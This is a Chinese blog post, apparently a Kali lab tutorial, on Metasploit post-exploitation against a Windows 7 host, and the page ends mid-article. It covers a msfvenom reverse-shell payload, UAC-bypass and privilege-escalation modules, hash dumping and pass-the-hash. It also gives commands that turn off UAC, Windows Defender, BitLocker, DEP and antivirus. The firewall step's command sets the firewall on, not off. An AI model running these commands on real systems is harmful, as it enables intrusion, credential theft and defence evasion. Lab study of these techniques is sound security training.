@@ -1,0 +1,1773 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Kali渗透测试-MSF【后渗透】, 无心">
+    <meta name="description" content="Msf后渗透测试阶段
+
+已经取得目标系统控制权后扩大战果
+提权
+信息搜集
+渗透内网
+永久后门
+
+
+
+
+基于已有session扩大战果获取shellmsfvenom -a x86 --platform windows -p windows&amp;#">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Kali渗透测试-MSF【后渗透】 | 无心</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+       background-repeat:no-repeat;
+       background-size: 100% 100%;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">无心</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">无心</div>
+        <div class="logo-desc">
+            
+            你要努力，你想要的，只能你自己给；别人给的，你要问问自己，拿的起吗。
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Kali渗透测试-MSF【后渗透】</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Kali/">
+                                <span class="chip bg-color">Kali</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">内网渗透</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Kali/" class="post-category">
+                                Kali
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-02-22
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.6k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="Msf后渗透测试阶段"><a href="#Msf后渗透测试阶段" class="headerlink" title="Msf后渗透测试阶段"></a>Msf后渗透测试阶段</h2><blockquote>
+<ul>
+<li>已经取得目标系统控制权后扩大战果<ul>
+<li>提权</li>
+<li>信息搜集</li>
+<li>渗透内网</li>
+<li>永久后门</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h2 id="基于已有session扩大战果"><a href="#基于已有session扩大战果" class="headerlink" title="基于已有session扩大战果"></a>基于已有session扩大战果</h2><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.216.171 LPORT&#x3D;4444 -b &quot;\x00&quot; -e x86&#x2F;shikata_ga_nai -f exe -o 1.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222094447323.png" alt="image-20230222094447323"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><blockquote>
+<p>此时虽然已经获取shell，并且获取的用户shell也属于管理员权限但也是禁用状态，出于安全考虑，设置了UAC(User Account Control)用户访问控制，尽管用户处于管理员组，但需要运行管理员权限才能运行的功能时都需要通过UAC控制。</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222095856904.png" alt="image-20230222095856904"></p>
+<h4 id="绕过UAC"><a href="#绕过UAC" class="headerlink" title="绕过UAC"></a>绕过UAC</h4><blockquote>
+<p><strong>绕过UAC不代表关闭UAC</strong></p>
+<p>UAC的定义：</p>
+<p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p>
+<p>UAC的运作：</p>
+<p>一旦程序执行设计系统更改&#x2F;特定任务就会触发UAC，除非尝试执行他们的进程以管理员权限运行，否则这些操作都将被阻止。而没有管理员权限将无法执行以下操作：</p>
+<p>①注册表修改（如果注册表项位于如HKEY_LOCAL_MACHINE下【因为它影响多个用户】，它将是只读的）</p>
+<p>②加载设备驱动程序</p>
+<p>③DLL注入</p>
+<p>④修改系统时间（clock）</p>
+<p>⑤修改用户账户控制设置（通过注册表可以启用&#x2F;禁用它，但你需要正确的权限才能执行该操作）</p>
+<p>⑥修改受保护的目录（如Windows文件夹，pragram files）</p>
+<p>⑦计划任务（例如，以管理员权限自启动）</p>
+</blockquote>
+<h5 id="诱使客户端允许UAC访问"><a href="#诱使客户端允许UAC访问" class="headerlink" title="诱使客户端允许UAC访问"></a>诱使客户端允许UAC访问</h5><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;ask
+运行任何程序需要system账号功能时询问用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222100747613.png" alt="image-20230222100747613"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222101009848.png" alt="image-20230222101009848"></p>
+<blockquote>
+<p>点击”是”，在服务端就会被拿到shell</p>
+<p>此时session2与session1已经不同了，session2是经过UAC允许执行的merterpreter shell</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222101022299.png" alt="image-20230222101022299"></p>
+<h5 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h5><blockquote>
+<p>此时提权就会成功</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222101832839.png" alt="image-20230222101832839"></p>
+<h5 id="隐蔽绕过UAC控制（一）"><a href="#隐蔽绕过UAC控制（一）" class="headerlink" title="隐蔽绕过UAC控制（一）"></a>隐蔽绕过UAC控制（一）</h5><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection
+此模块使用DLL动态链接库的方式注入进去<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222102500880.png" alt="image-20230222102500880"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222102435216.png" alt="image-20230222102435216"></p>
+<blockquote>
+<p>此模块适用于x86架构，而此时win7客户端是x64，导致获取session不成功</p>
+</blockquote>
+<h5 id="隐蔽绕过UAC控制（二）"><a href="#隐蔽绕过UAC控制（二）" class="headerlink" title="隐蔽绕过UAC控制（二）"></a>隐蔽绕过UAC控制（二）</h5><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222103018391.png" alt="image-20230222103018391"></p>
+<h2 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h2><blockquote>
+<p>若获取的用户shell只是一个普通用户账号，就算是绕过UAC也无法提权成为system</p>
+<p>利用本地登录小权限的用户执行本地漏洞进行提权</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;ms13_053_schlamperei
+use exploit&#x2F;windows&#x2F;local&#x2F;ms13_081_track_popup_menu
+use exploit&#x2F;windows&#x2F;local&#x2F;ms13_097_ie_registry_symlink
+use exploit&#x2F;windows&#x2F;local&#x2F;ppr_flatten_rec
+以上4个模块都是基于x86执行的漏洞，而客户端是x64，无法利用获取shell，但流程如下，最终的结果都是获取管理员权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222103818194.png" alt="image-20230222103818194"></p>
+<blockquote>
+<p>此模块不支持x64系统执行</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222103932469.png" alt="image-20230222103932469"></p>
+<h2 id="图形化payload"><a href="#图形化payload" class="headerlink" title="图形化payload"></a>图形化payload</h2><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;vncinject&#x2F;reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>payload在windows中执行之后，kali本地侦听4444端口，VNC图形化shell反弹给4444端口，在进行端口转换，转换到5900端口</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222110857094.png" alt="image-20230222110857094"></p>
+<blockquote>
+<p>windows客户端无论做什么操作都会被看到，但无法被攻击者操控</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222111232427.png" alt="image-20230222111232427"></p>
+<h2 id="Pseexec模块之Passthehash"><a href="#Pseexec模块之Passthehash" class="headerlink" title="Pseexec模块之Passthehash"></a>Pseexec模块之Passthehash</h2><h3 id="提取hash值"><a href="#提取hash值" class="headerlink" title="提取hash值"></a>提取hash值</h3><blockquote>
+<p><strong>注：hashdump报错，是由于进程权限不足，迁移进程即可</strong></p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222115106393.png" alt="image-20230222115106393"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222115206316.png" alt="image-20230222115206316"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222115222555.png" alt="image-20230222115222555"></p>
+<h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><h4 id="msf配置服务端"><a href="#msf配置服务端" class="headerlink" title="msf配置服务端"></a>msf配置服务端</h4><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222115802141.png" alt="image-20230222115802141"></p>
+<h4 id="执行失败"><a href="#执行失败" class="headerlink" title="执行失败"></a>执行失败</h4><blockquote>
+<p>报错是由于UAC阻止了访问，需要关闭UAC，攻击者要求客户端关闭UAC这是不现实的，那就需要已经通过绕过UAC获取到的shell进行关闭客户端的UAC控制</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222121355434.png" alt="image-20230222121355434"></p>
+<h4 id="关闭客户端UAC"><a href="#关闭客户端UAC" class="headerlink" title="关闭客户端UAC"></a>关闭客户端UAC</h4><blockquote>
+<p>在客户端shell中执行以下命令，修改注册表关闭UAC</p>
+<p>原理就是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，已达到帮助阻止恶意程序损坏系统的效果。</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v EnableLUA &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f
+ADD 添加一个注册表项
+-v 创建键值
+-t 键值类型
+-d 键值的值
+-f 强制修改注册表项<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222122321001.png" alt="image-20230222122321001"></p>
+<blockquote>
+<p>关闭UAC之后需要目标主机重启才能生效</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222122331040.png" alt="image-20230222122331040"></p>
+<h5 id="重启目标主机"><a href="#重启目标主机" class="headerlink" title="重启目标主机"></a>重启目标主机</h5><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222122611728.png" alt="image-20230222122611728"></p>
+<h4 id="继续exploit"><a href="#继续exploit" class="headerlink" title="继续exploit"></a>继续exploit</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222122812411.png" alt="image-20230222122812411"></p>
+<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><blockquote>
+<p>取得system或者管理员权限之后关闭防火墙等</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set allprofiles state on<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222123253309.png" alt="image-20230222123253309"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222123307854.png" alt="image-20230222123307854"></p>
+<h3 id="关闭Windefend"><a href="#关闭Windefend" class="headerlink" title="关闭Windefend"></a>关闭Windefend</h3><blockquote>
+<p>关闭windows自带的杀毒软件</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">net stop windefend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222123448780.png" alt="image-20230222123448780"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222123651102.png" alt="image-20230222123651102"></p>
+<h3 id="关闭Bitlocker磁盘加密"><a href="#关闭Bitlocker磁盘加密" class="headerlink" title="关闭Bitlocker磁盘加密"></a>关闭Bitlocker磁盘加密</h3><pre class="line-numbers language-none"><code class="language-none">manage-bde -off C:               # 关闭C盘加密
+manage-bde -status C:            # 查看Bitlocker是否启动<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="关闭DEP"><a href="#关闭DEP" class="headerlink" title="关闭DEP"></a>关闭DEP</h3><blockquote>
+<p>基于硬件防护恶意软件被CPU执行的技术</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">bcdedit.exe &#x2F;set &#123;current&#125; nx AlwaysOff<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="杀死防病毒软件"><a href="#杀死防病毒软件" class="headerlink" title="杀死防病毒软件"></a>杀死防病毒软件</h3><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;manage&#x2F;killav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222125131606.png" alt="image-20230222125131606"></p>
+<h3 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h3><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222125327494.png" alt="image-20230222125327494"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222125705792.png" alt="image-20230222125705792"></p>
+<h4 id="利用脚本启动RDP"><a href="#利用脚本启动RDP" class="headerlink" title="利用脚本启动RDP"></a>利用脚本启动RDP</h4><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222132038559.png" alt="image-20230222132038559"></p>
+<h3 id="查看远程桌面"><a href="#查看远程桌面" class="headerlink" title="查看远程桌面"></a>查看远程桌面</h3><pre class="line-numbers language-none"><code class="language-none">screenshot     # 截取当前客户端桌面截图
+load&#x2F;use espia      # 使用插件，截取目标系统桌面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
